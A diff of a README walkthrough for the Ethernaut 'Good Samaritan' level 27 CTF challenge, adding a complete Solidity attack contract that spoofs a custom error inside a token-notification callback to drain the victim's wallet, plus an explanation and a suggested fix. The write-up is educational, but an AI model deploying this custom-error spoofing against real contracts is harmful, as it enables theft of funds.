@@ -1,4 +1,4 @@
-# Good Samaritan challenge - Level 27 - Work In Progress
+# Good Samaritan challenge - Level 27
 
 <p align="left"> <img src="https://komarev.com/ghpvc/?username=Level27&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>
 
@@ -25,14 +25,15 @@ function requestDonation() external returns(bool enoughBalance){
 }
 
 /**
-* @notice This is the interface used to notify attack contract called from the main attack suface, 
-* a dependency of the victim contract.
+* @notice This is the interface used to notify the attack contract, it is called from the main attack suface, 
+* Coin a dependency of the victim contract.
 */
 interface INotifyable {
     function notify(uint256 amount) external;
 }
 
-/** @notice This transfer function from contract Coin.sol, is the main attack surface from this dependency 
+/** 
+* @notice This transfer function from contract Coin, is the main attack surface from this dependency 
 * of the victim contract, because of the second if() statement. Player will use INotifyable() from the attack 
 * contract to intiate the attack on the main attack target from the victim contract. 
 */
@@ -104,7 +105,7 @@ constructor() {
  
  ## 🆘 The victim contract's dependency
  
- - this code snippet below from the victim contract's dependency contract Coin.sol, shows that if a contract is receiving the tokens, the contract will calls the interface INotifyable to send the notice,
+ - this code snippet below, coming from the victim contract's dependency contract Coin, shows that if a contract is receiving the tokens, the contract will calls the interface INotifyable to send the notice,
 
 ```Solidity
  function transfer(address dest_, uint256 amount_) external {
@@ -140,7 +141,12 @@ interface INotifyable {
 ```yml
 The vulnerability:
 ```
-- TODO
+- There are no limits to the amount of tokens this function transfers,
+
+```Solidity
+// there are no limits on this function.
+ wallet.transferRemainder(msg.sender);
+ ```
 
 ## 💥 The attack contract in detail
 
@@ -148,10 +154,46 @@ The vulnerability:
 The attack contract:
 ```
 
-- TODO
+- The attack contract uses an interface to call the main target's requestDonation() function,
 
 ```Solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.7;
 
+/// @notice This is the interface to call the main target's function.
+interface IGoodSamaritan {
+  function requestDonation() external returns (bool enoughBalance);
+} 
+
+/// @title Ethernaut challenge 27, hack contract, steal everything! 
+/// @author WrappedUsername
+contract GoodSamaritanAttack {  
+  /// @notice This error is used to satisfy the if() statement in the main target
+  error NotEnoughBalance();
+```
+
+- The attack function is used to call the IGoodSamaritan interface,
+
+```Solidity
+  /** 
+  * @notice This is the attack, player simply requests a donation, 
+  * and steals everything with one click!
+  */
+  function attack(address _addr) external { 
+     IGoodSamaritan(_addr).requestDonation();
+  }
+
+  /// @notice Notify is called when this contract receives the tokens.
+  function notify(uint256 amount) external pure {
+    /** 
+    * @notice When the attack contract is notified about receiving 10 
+    * tokens the attack contract reverts NotEnoughBalance() to the victim contract.
+    */
+    if (amount == 10) {
+        revert NotEnoughBalance();
+    } 
+  }
+}
 ```
 
 ## 💥 The attack in detail
@@ -160,7 +202,7 @@ The attack contract:
 The secret to the attack:
 ```
 
-- The trick with using the notice to intiate the attack is to *not* revert the *entire* transaction with the error, so player will receive the coins, and after that revert NotEnoughBalance() 
+- The trick with using the notice to intiate the attack is to *not* revert the *entire* transaction with the error, so player will receive the tokens, and after that revert NotEnoughBalance() 
 
 ```Solidity
 /** 
@@ -172,7 +214,7 @@ The secret to the attack:
     } 
 ```
 
-## 🩺 How can we fix this problem?
+## 🩺 How can we fix this vulnerablity in the victim contract?
 
 - Simple, limit the amount that can be transfered with a simple require() statement.
 
